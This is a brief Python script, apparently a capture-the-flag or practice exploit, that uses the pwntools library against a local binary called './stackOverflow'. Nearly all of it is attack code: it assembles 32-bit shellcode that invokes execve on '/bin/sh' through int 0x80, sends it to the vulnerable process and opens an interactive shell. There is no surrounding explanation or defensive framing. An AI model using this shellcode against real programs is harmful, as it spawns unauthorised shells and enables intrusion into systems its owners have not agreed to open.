
from pwn import *  

code1 = '/'
code2 = 'bin/sh\0\0' 

code2 += asm('mov eax,11')
code2 += asm('mov ebx,[esp + 4]')
code2 += asm('xor ecx,ecx')
code2 += asm('xor edx,edx')
code2 += asm('int 0x80')
code2 += asm('ret')

r = process('./stackOverflow')
r.send(code1)
r.send(code2)
r.interactive()











